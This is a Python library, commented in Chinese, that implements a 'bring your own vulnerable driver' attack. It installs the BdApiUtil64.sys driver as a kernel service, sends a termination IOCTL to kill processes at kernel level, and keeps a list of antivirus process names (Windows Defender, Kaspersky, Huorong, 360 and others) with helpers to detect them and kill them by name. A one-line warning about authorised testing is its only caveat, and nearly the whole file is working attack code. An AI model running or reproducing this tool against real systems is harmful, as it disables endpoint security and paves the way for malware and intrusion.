#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BYOVD Library - 内核级进程终止库

⚠️ 安全警告：本库仅供授权的安全测试、渗透测试和教育工作使用。

使用示例:
    from byovd_lib import BYOVD
    
    with BYOVD() as byovd:
        byovd.kill(1234)              # 终止进程
        byovd.list_processes()        # 列出进程
        byovd.detect_av()             # 检测杀毒软件
        byovd.has_av("火绒")          # 检查特定杀软
"""

import os
import sys
import time
import ctypes
import tempfile
import base64
from pathlib import Path
from typing import Optional, Any, List, Tuple

# 依赖库导入 - 延迟加载以避免初始化时检查
import importlib
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    import win32file
    import win32service
    import win32con
    import winerror
    import psutil

def _import_module(name: str):
    """延迟导入模块"""
    try:
        return importlib.import_module(name)
    except ImportError:
        raise ImportError(f"缺少依赖库 {name}\n请运行：pip install pywin32 psutil")

# 在使用时导入，避免初始化时检查
_win32file = None  # type: win32file
_win32service = None  # type: win32service
_win32con = None  # type: win32con
_winerror = None  # type: winerror
_psutil = None  # type: psutil

# =============================================================================
# 配置常量
# =============================================================================

DRIVER_NAME = "BdApiUtil64"
DRIVER_FILENAME = "BdApiUtil64.sys"
DEVICE_PATH = r"\\.\BdApiUtil"
SERVICE_NAME = "BdApiUtil64"
SERVICE_DISPLAY_NAME = "BdApiUtil64 Driver"
IOCTL_TERMINATE_PROCESS = 0x800024B4

# 驱动文件的 base64 编码 (可选，嵌入驱动时使用)
DRIVER_BASE64: Optional[str] = None

# 杀毒软件进程数据库
ANTIVIRUS_PROCESSES = {
    "msmpeng.exe": "Windows Defender",
    "msseces.exe": "Microsoft Security Essentials",
    "msascui.exe": "Windows Defender",
    "msascuil.exe": "Windows Defender",
    "mssense.exe": "Windows Defender",
    "securityhealthservice.exe": "Windows Defender",
    "mpcmdrun.exe": "Windows Defender",
    "avp.exe": "Kaspersky",
    "avpcc.exe": "Kaspersky",
    "kavtray.exe": "Kaspersky",
    "egui.exe": "ESET NOD32",
    "ekrn.exe": "ESET NOD32",
    "avastui.exe": "Avast",
    "avastsvc.exe": "Avast",
    "avgsvc.exe": "AVG",
    "avgui.exe": "AVG",
    "bdagent.exe": "BitDefender",
    "vsserv.exe": "BitDefender",
    "mcshield.exe": "McAfee",
    "shstat.exe": "McAfee",
    "vstskmgr.exe": "McAfee",
    "wsctrl.exe": "火绒 Huorong",
    "usysdiag.exe": "火绒 Huorong",
    "hipsdaemon.exe": "火绒 Huorong",
    "hipstray.exe": "火绒 Huorong",
    "hwsd.exe": "火绒 Huorong",
    "hrtray.exe": "火绒 Huorong",
    "hwsdsvc.exe": "火绒 Huorong",
    "baidusdsvc.exe": "百度杀毒",
    "baidusd.exe": "百度杀毒",
    "baiduansvx.exe": "百度卫士",
    "360tray.exe": "360 安全卫士",
    "360safe.exe": "360 安全卫士",
    "qqpcmgr.exe": "腾讯电脑管家",
    "qqpcsvc.exe": "腾讯电脑管家",
}


# =============================================================================
# 驱动加载器
# =============================================================================

def _ensure_deps():
    """确保依赖已导入"""
    global _win32file, _win32service, _win32con, _winerror, _psutil
    if _win32file is None:
        _win32file = _import_module('win32file')  # type: ignore
        _win32service = _import_module('win32service')  # type: ignore
        _win32con = _import_module('win32con')  # type: ignore
        _winerror = _import_module('winerror')  # type: ignore
        _psutil = _import_module('psutil')  # type: ignore

class DriverLoader:
    """驱动加载器类"""
    
    def __init__(self, driver_data: Optional[bytes] = None, service_name: Optional[str] = None):
        _ensure_deps()
        self._driver_data = driver_data
        self._service_name = service_name or SERVICE_NAME
        self._temp_driver_path: Optional[str] = None
        self._service_created = False
        self._service_started = False
        self._scm_handle = None
        self._service_handle = None
    
    def __enter__(self):
        self.load()
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.unload()
        return False
    
    def _load_driver_data(self) -> bytes:
        """加载驱动数据"""
        if self._driver_data is not None:
            return self._driver_data
        
        if DRIVER_BASE64 is not None:
            return base64.b64decode(DRIVER_BASE64)
        
        # 尝试从文件加载
        script_dir = Path(__file__).parent
        driver_path = script_dir / DRIVER_FILENAME
        
        if driver_path.exists():
            return driver_path.read_bytes()
        
        # 尝试当前目录
        cwd_driver = Path.cwd() / DRIVER_FILENAME
        if cwd_driver.exists():
            return cwd_driver.read_bytes()
        
        raise FileNotFoundError(
            f"无法找到驱动文件 {DRIVER_FILENAME}\n"
            f"请将驱动文件放置到:\n"
            f"  - {driver_path}\n"
            f"  或\n"
            f"  - {cwd_driver}"
        )
    
    def _write_temp_driver(self) -> str:
        """写入临时文件"""
        driver_data = self._load_driver_data()
        self._temp_driver_path = os.path.join(tempfile.gettempdir(), DRIVER_FILENAME)
        with open(self._temp_driver_path, 'wb') as f:
            f.write(driver_data)
        return self._temp_driver_path
    
    def _cleanup_temp_driver(self):
        """清理临时文件"""
        if self._temp_driver_path and os.path.exists(self._temp_driver_path):
            try:
                os.remove(self._temp_driver_path)
            except PermissionError:
                try:
                    ctypes.windll.kernel32.MoveFileExW(
                        self._temp_driver_path, None, 0x00000004
                    )
                except:
                    pass
            self._temp_driver_path = None
    
    def is_loaded(self) -> bool:
        return self._service_started
    
    def load(self) -> bool:
        """加载驱动"""
        if self._service_started:
            return True
        
        scm = None
        try:
            # 首先尝试以只读方式打开 SCM
            try:
                scm = _win32service.OpenSCManager(None, None, _win32service.SC_MANAGER_CONNECT)
            except _win32service.error:
                # 如果只读不行，尝试完全访问
                scm = _win32service.OpenSCManager(None, None, _win32service.SC_MANAGER_ALL_ACCESS)
            
            # 尝试打开已有服务
            try:
                self._service_handle = _win32service.OpenService(
                    scm, self._service_name,
                    _win32service.SERVICE_START | _win32service.SERVICE_STOP | _win32service.SERVICE_QUERY_STATUS
                )
                
                # 尝试启动服务
                try:
                    _win32service.StartService(self._service_handle, [])
                    self._service_started = True
                    _win32service.CloseServiceHandle(scm)
                    scm = None
                    return True
                except _win32service.error as e:
                    if e.winerror == _winerror.ERROR_SERVICE_ALREADY_RUNNING:
                        self._service_started = True
                        _win32service.CloseServiceHandle(scm)
                        scm = None
                        return True
                    # 其他错误，继续尝试创建新服务
                    _win32service.CloseServiceHandle(self._service_handle)
                    self._service_handle = None
                    
            except _win32service.error:
                # 服务不存在，继续创建
                pass
            
            # 关闭只读 SCM，重新以完全访问打开
            if scm is not None:
                _win32service.CloseServiceHandle(scm)
                scm = None
            
            # 创建新服务
            scm = _win32service.OpenSCManager(None, None, _win32service.SC_MANAGER_ALL_ACCESS)
            driver_path = self._write_temp_driver()
            
            self._service_handle = _win32service.CreateService(
                scm, self._service_name, SERVICE_DISPLAY_NAME,
                _win32service.SERVICE_ALL_ACCESS,
                _win32service.SERVICE_KERNEL_DRIVER,
                _win32service.SERVICE_DEMAND_START,
                _win32service.SERVICE_ERROR_IGNORE,
                driver_path, None, False, None, None, None
            )
            self._service_created = True
            
            _win32service.StartService(self._service_handle, [])
            self._service_started = True
            
            _win32service.CloseServiceHandle(scm)
            scm = None
            return True
            
        except Exception as e:
            print(f"[!] 驱动加载失败：{e}")
            if scm is not None:
                try:
                    _win32service.CloseServiceHandle(scm)
                except:
                    pass
            self._cleanup()
            return False
    
    def _cleanup(self):
        if self._service_handle is not None:
            try:
                _win32service.CloseServiceHandle(self._service_handle)
            except:
                pass
            self._service_handle = None
    
    def unload(self) -> bool:
        """卸载驱动"""
        success = True
        
        if self._service_started and self._service_handle is not None:
            try:
                _win32service.ControlService(self._service_handle, _win32service.SERVICE_CONTROL_STOP)
                time.sleep(1)
                self._service_started = False
            except Exception as e:
                print(f"[!] 停止服务失败：{e}")
                success = False
        
        if self._service_created and self._service_handle is not None:
            try:
                _win32service.DeleteService(self._service_handle)
            except Exception as e:
                print(f"[!] 删除服务失败：{e}")
                success = False
        
        self._cleanup()
        self._cleanup_temp_driver()
        return success
    
    def get_device_handle(self):
        """获取设备句柄"""
        if not self._service_started:
            return None
        try:
            return _win32file.CreateFile(
                DEVICE_PATH,
                _win32con.GENERIC_READ | _win32con.GENERIC_WRITE,
                0, None, _win32con.OPEN_EXISTING, 0, None
            )
        except Exception as e:
            print(f"[!] 获取设备句柄失败：{e}")
            return None


# =============================================================================
# BYOVD 主类
# =============================================================================

class BYOVD:
    """
    BYOVD 统一接口类
    
    提供内核级进程终止功能的统一接口
    """
    
    def __init__(self, driver_data: Optional[bytes] = None, auto_load: bool = True):
        """
        初始化 BYOVD
        
        Args:
            driver_data: 驱动二进制数据，如果为 None 则从文件加载
            auto_load: 是否自动加载驱动
        """
        self._driver_loader = DriverLoader(driver_data=driver_data)
        self._device_handle: Optional[Any] = None
        self._auto_load = auto_load
        
        if auto_load:
            self.load_driver()
    
    def __enter__(self):
        return self
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()
        return False
    
    def load_driver(self) -> bool:
        """加载驱动"""
        return self._driver_loader.load()
    
    def unload_driver(self) -> bool:
        """卸载驱动"""
        return self._driver_loader.unload()
    
    def is_driver_loaded(self) -> bool:
        """检查驱动加载状态"""
        return self._driver_loader.is_loaded()
    
    def _ensure_device_handle(self) -> bool:
        """确保设备句柄已打开"""
        if self._device_handle is None:
            if not self.is_driver_loaded():
                if not self.load_driver():
                    return False
            handle = self._driver_loader.get_device_handle()
            if handle is not None:
                self._device_handle = handle
        return self._device_handle is not None
    
    def kill(self, pid: int) -> Tuple[bool, str]:
        """
        终止指定 PID 的进程
        
        Args:
            pid: 进程 ID
        
        Returns:
            (成功标志，消息)
        """
        if not self._ensure_device_handle():
            return False, "无法打开设备句柄"
        
        try:
            pid_buffer = pid.to_bytes(4, byteorder='little')
            _win32file.DeviceIoControl(
                self._device_handle,
                IOCTL_TERMINATE_PROCESS,
                pid_buffer,
                None
            )
            time.sleep(0.5)
            if _psutil.pid_exists(pid):
                return False, f"进程 {pid} 仍在运行"
            return True, f"进程 {pid} 已终止"
        except Exception as e:
            return False, f"终止失败：{e}"
    
    def kill_by_name(self, name: str, exact_match: bool = True) -> List[Tuple[int, bool, str]]:
        """
        根据进程名终止进程
        
        Args:
            name: 进程名
            exact_match: 是否精确匹配
        
        Returns:
            [(PID, 成功标志，消息)]
        """
        results = []
        for proc in _psutil.process_iter(['pid', 'name']):
            try:
                proc_name = proc.info['name']
                pid = proc.info['pid']
                
                if exact_match:
                    if proc_name.lower() == name.lower():
                        results.append((pid, *self.kill(pid)))
                else:
                    if name.lower() in proc_name.lower():
                        results.append((pid, *self.kill(pid)))
            except (_psutil.NoSuchProcess, _psutil.AccessDenied):
                continue
        return results
    
    def list_processes(self) -> List[Tuple[int, str]]:
        """
        列出当前进程
        
        Returns:
            [(PID, 进程名)]
        """
        processes = []
        for proc in _psutil.process_iter(['pid', 'name']):
            try:
                processes.append((proc.info['pid'], proc.info['name']))
            except (_psutil.NoSuchProcess, _psutil.AccessDenied):
                continue
        return sorted(processes, key=lambda x: x[0])
    
    def get_process_by_name(self, name: str, exact_match: bool = False) -> List[Tuple[int, str]]:
        """
        根据进程名查找进程
        
        Args:
            name: 进程名
            exact_match: 是否精确匹配
        
        Returns:
            [(PID, 进程名)]
        """
        results = []
        for pid, proc_name in self.list_processes():
            if exact_match:
                if proc_name.lower() == name.lower():
                    results.append((pid, proc_name))
            else:
                if name.lower() in proc_name.lower():
                    results.append((pid, proc_name))
        return results
    
    def detect_av(self) -> List[Tuple[int, str, str]]:
        """
        检测杀毒软件进程
        
        Returns:
            [(PID, 进程名，杀毒软件名)]
        """
        detected = []
        for proc in _psutil.process_iter(['pid', 'name']):
            try:
                name = proc.info['name'].lower()
                pid = proc.info['pid']
                if name in ANTIVIRUS_PROCESSES:
                    detected.append((pid, proc.info['name'], ANTIVIRUS_PROCESSES[name]))
            except (_psutil.NoSuchProcess, _psutil.AccessDenied):
                continue
        return detected
    
    def has_av(self, av_name: Optional[str] = None) -> bool:
        """
        检查是否有杀毒软件运行
        
        Args:
            av_name: 杀毒软件名称，None 表示任意
        
        Returns:
            是否检测到
        """
        av_list = self.detect_av()
        if not av_list:
            return False
        if av_name is None:
            return True
        av_name_lower = av_name.lower()
        return any(av_name_lower in name.lower() for _, _, name in av_list)
    
    def close(self):
        """关闭资源"""
        if self._device_handle is not None:
            try:
                _win32file.CloseHandle(int(self._device_handle))  # type: ignore
            except:
                pass
            self._device_handle = None
        if self._auto_load:
            self.unload_driver()


# 导出
__all__ = ["BYOVD", "DriverLoader"]
__version__ = "1.0.0"